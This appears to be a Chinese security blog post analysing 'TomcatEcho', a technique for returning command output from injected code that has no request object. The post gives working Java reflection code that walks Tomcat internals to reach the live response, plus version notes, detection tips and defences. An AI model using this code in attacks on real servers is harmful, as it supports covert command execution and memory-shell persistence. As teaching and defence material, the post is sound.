---
title: TomcatEcho 无 request 命令回显
date: 2026-07-31
categories: 
- 漏洞分析
tags: 
- tomcat
- 回显
- 内存马
- Java安全
- 命令回显
---

# TomcatEcho：无 request 场景的命令回显

内存马（尤其 [Listener]({% post_url 2025-12-27-Tomcat_ listener内存马 %}) / [Valve]({% post_url 2026-08-06-Tomcat_Valve内存马 %}) 型）和[反序列化 / JNDI 注入]({% post_url 2026-07-28-反序列化与JNDI无文件注入内存马 %})场景里，恶意代码常常跑在**拿不到 request/response 的地方**：`static` 块、无参构造方法、`requestInitialized` 回调。命令执行了，结果怎么回给攻击者？——在全局无 request 引用的情况下，**从线程上下文类加载器 / 容器内部把当前请求对象"翻"出来**，这就是 TomcatEcho。

**本质**：`Thread.currentThread().getContextClassLoader()` 持有容器引用，逐层反射 `resources → context → service → connectors → protocolHandler → handler → global → processors[] → req`，从处理当前请求的线程栈里还原出 `connector.Request`，`getResponse()` 直接回显。整体框架见 [《内存马原理总纲》]({% post_url 2025-12-26-内存马原理总纲 %})。

---

## 一、为什么需要 TomcatEcho

### 1.1 回显方式的演进

| 方式 | 适用场景 | 局限 |
|------|---------|------|
| 直接在 handler 里拿 response | Filter / Servlet / Valve 的 `doFilter` / `invoke` | 方法签名里就有，无需回显技巧 |
| 两步反射 | Listener 的 `requestInitialized`：`RequestFacade.request` → `connector.Request.response` | 仍需要一个 request 对象在手 |
| **TomcatEcho 链** | **static 块 / 构造方法 / 反序列化入口，完全无 request** | 依赖 Tomcat 内部字段名，版本差异敏感 |

### 1.2 触发场景

```java
// JNDI 加载的类：只有构造方法会被自动执行
public class Inject {
    public Inject() { /* 这里没有 request！ */ }
}

// 反序列化加载的类：只有 static 块 / 构造方法
public class ShellLoader extends AbstractTranslet {
    static { /* 这里也没有 request！ */ }
}

// Listener：只有 ServletRequestEvent，需两步反射拿 response
public class ListenerShell implements ServletRequestListener {
    public void requestInitialized(ServletRequestEvent sre) { /* ... */ }
}
```
这些场景下，`RequestContextHolder`（Spring）拿不到、`request.getSession().getServletContext()` 更拿不到——**只能从 JVM / 容器内部结构反推**。

---

## 二、两步反射的局限（Listener 场景）

Listener 的 `requestInitialized(ServletRequestEvent sre)` 能拿到 `ServletRequest`（实际是 `RequestFacade`），所以可以两步反射拿 response：

```java
// RequestFacade 只有 request 字段（指向内部 connector.Request）
Field reqField = servletRequest.getClass().getDeclaredField("request");
reqField.setAccessible(true);
Object innerRequest = reqField.get(servletRequest);

// connector.Request 有 response 字段
Field respField = innerRequest.getClass().getDeclaredField("response");
respField.setAccessible(true);
HttpServletResponse response = (HttpServletResponse) respField.get(innerRequest);
```
但它**依赖手里有一个 request 对象**。static 块 / 构造方法里什么都没有，这条路走不通——只能上 TomcatEcho。

---

## 三、TomcatEcho 完整链

### 3.1 核心思想

`Thread.currentThread().getContextClassLoader()` 在 Web 应用线程里拿到的是 `WebappClassLoaderBase`，它一路持有容器对象：

```
Thread.currentThread().getContextClassLoader()   // WebappClassLoaderBase
  → resources          : StandardRoot             // Web 资源根
  → context            : StandardContext           // 当前应用
  → context            : ApplicationContext        // （内部还有一个同名字段）
  → service            : StandardService           // 服务
  → connectors[0]      : Connector                 // 连接器（处理请求的）
  → protocolHandler    : AbstractProtocol          // 协议处理器
  → handler            : AbstractProtocol$ConnectionHandler
  → global             : RequestGroupInfo          // 全局请求统计
  → processors[]       : ArrayList<RequestInfo>    // 所有已分配的请求
  → req                : org.apache.coyote.Request  // 找到当前请求
  → getNote(1)         : connector.Request          // 还原成高层请求对象
  → getResponse()      : connector.Response         // 回显
```
`processors[]` 里是**所有已分配的 RequestInfo**（当前正在处理的请求一定在列表里），遍历它逐个 `getNote(1)`，就能拿到当前线程正在处理的请求。

### 3.2 代码实现

```java
import org.apache.catalina.connector.*;
import org.apache.catalina.loader.WebappClassLoaderBase;
import org.apache.coyote.RequestInfo;
import java.util.ArrayList;

public class TomcatEcho {

    public static void echo(String result) throws Exception {
        // 链式反射拿到 processors 列表（getField 见 3.3）
        ArrayList<RequestInfo> infos = (ArrayList<RequestInfo>) getField(
            Thread.currentThread().getContextClassLoader(),
            WebappClassLoaderBase.class,
            "resources:org.apache.catalina.webresources.StandardRoot",
            "context:org.apache.catalina.core.StandardContext",
            "context",
            "service:org.apache.catalina.core.StandardService",
            "connectors_0:org.apache.catalina.connector.Connector",
            "protocolHandler:org.apache.coyote.AbstractProtocol",
            "handler:org.apache.coyote.AbstractProtocol$ConnectionHandler",
            "global", "processors"
        );

        for (RequestInfo ri : infos) {
            org.apache.coyote.Request r =
                (org.apache.coyote.Request) getField(ri, RequestInfo.class, "req");
            Request req = (Request) r.getNote(1);   // getNote(1) → connector.Request
            Response resp = req.getResponse();      // 直接回显
            resp.getWriter().write(result);
            resp.getWriter().flush();
        }
    }
}
```
### 3.3 getField()：链式反射工具

上面的 `getField(obj, clazz, "a:b", "c_1:d", ...)` 支持三种语法：

| 语法 | 含义 | 示例 |
|------|------|------|
| `"name"` | 取字段 | `"context"` |
| `"name:Type"` | 取字段并强转类型 | `"resources:org.apache.catalina.webresources.StandardRoot"` |
| `"name_1:Type"` | 取字段后按下标取数组/List 元素，再强转 | `"connectors_0:org.apache.catalina.connector.Connector"` |

```java
public static Object getField(Object obj, Class<?> clazz, String... fieldNames) throws Exception {
    for (String part : fieldNames) {
        String[] segs = part.split("_", 2);
        Field field = clazz.getDeclaredField(segs[0].split(":")[0]);
        field.setAccessible(true);
        obj = field.get(obj);
        if (segs.length > 1) {                 // 带下标：取数组/List 元素
            String[] parts = segs[1].split(":", 2);
            int idx = Integer.parseInt(parts[0]);
            obj = obj instanceof List
                ? ((List<?>) obj).get(idx)
                : Array.get(obj, idx);
            clazz = parts.length > 1 ? Class.forName(parts[1]) : obj.getClass();
        } else {                                // 不带下标：强转
            clazz = part.contains(":") ? Class.forName(part.split(":")[1]) : field.getType();
        }
    }
    return obj;
}
```
例如 `"connectors_0:org.apache.catalina.connector.Connector"` = 取 `connectors` 字段的第 0 个元素并强转成 `Connector`。**链式反射 + 类型标注**，把原本十几行的逐字段反射压缩成一行参数表，直观且不易写错。

### 3.4 为什么 getNote(1)

`org.apache.coyote.Request` 是协议层的请求对象，`getNote(int)` 是 Tomcat 用来临时挂载关联对象的槽位。Tomcat 内部约定 `note(1)` 保存着对应的 `org.apache.catalina.connector.Request`（高层请求对象），拿到它之后 `getResponse()` 就能回显。

---

## 四、变体与版本差异

### 4.1 关键字段在 Tomcat 8.5 / 9 / 10

| 字段 | 稳定性 | 说明 |
|------|:------:|------|
| `WebappClassLoaderBase.resources` | 较稳 | 9 中 `getResources()` 方法弃用，但字段还在（反射取字段兼容） |
| `StandardService.connectors` | 较稳 | 数组，取 `[0]` |
| `AbstractProtocol.handler` | 较稳 | ConnectionHandler |
| `RequestInfo.global` / `processors` | 较稳 | 相对稳定 |
| `r.getNote(1)` | 稳定 | 跨版本约定一致 |

10.x 主要是 `javax` → `jakarta` 的包名差异，反射字段名基本一致。

### 4.2 变体：直接从 ConnectionHandler 定位

部分版本可以从 `AbstractProtocol$ConnectionHandler` 的内部 `connections` / `processors` map 直接定位当前线程，逻辑类似，只是入口字段不同。**核心不变：从线程能拿到的类加载器 → 容器 → 协议层 → 请求对象**。版本差异大时，多准备一两条备用链、逐个 try，是实战通用做法。

---

## 五、检测与防御

### 检测

```bash
# 内存 dump / Arthas 中找 TomcatEcho 特征：getNote(1)、RequestInfo、processors 反射遍历
# 或用 RASP 记录 ClassLoader.defineClass 与对 RequestInfo / coyote.Request 的反射访问
```
| 检测维度 | 说明 |
|----------|------|
| 反射调用特征 | 对 `RequestInfo` / `getNote` / `processors` 的非启动阶段反射 |
| 内存分析 | dump 后搜索 `getNote(1)` 字符串、`RequestInfo` 实例 |
| 行为 | 请求处理阶段出现"遍历所有处理器"的可疑调用 |

### 防御

| 层面 | 措施 |
|------|------|
| 事前 | 修复反序列化 / JNDI 入口——否则任何检测都是事后 |
| 事中 | RASP 监控 `ClassLoader.defineClass`、对 `RequestInfo` / `getNote` 的反射调用栈 |
| 加固 | 确认 Tomcat 版本并跟踪字段变更，必要时用容器镜像锁定版本，降低字段猜测成功率 |

---

## 总结

TomcatEcho 是"无 request 场景"下拿回显的兜底技术：它把「线程上下文类加载器 → 容器注册表 → 协议层请求对象」整条引用链当成跳板，用链式反射把 `connector.Request` 翻出来。三条核心经验：

1. **任何 Web 线程都能通过 `Thread.currentThread().getContextClassLoader()` 触达容器对象**——这是所有无 request 反射链的起点；
2. **`processors[]` + `getNote(1)` 是"找当前请求"的关键**——协议层对象和业务层对象靠 note 槽位关联；
3. **防御它的本质仍是切断入口**——先拿到代码执行，一切皆可发生。

> **延伸阅读**：[《反序列化与 JNDI 无文件注入内存马》]({% post_url 2026-07-28-反序列化与JNDI无文件注入内存马 %}) | [《内存马原理总纲》]({% post_url 2025-12-26-内存马原理总纲 %}) | [《Tomcat Listener 内存马》]({% post_url 2025-12-27-Tomcat_ listener内存马 %}) | [《Tomcat Valve 内存马》]({% post_url 2026-08-06-Tomcat_Valve内存马 %})
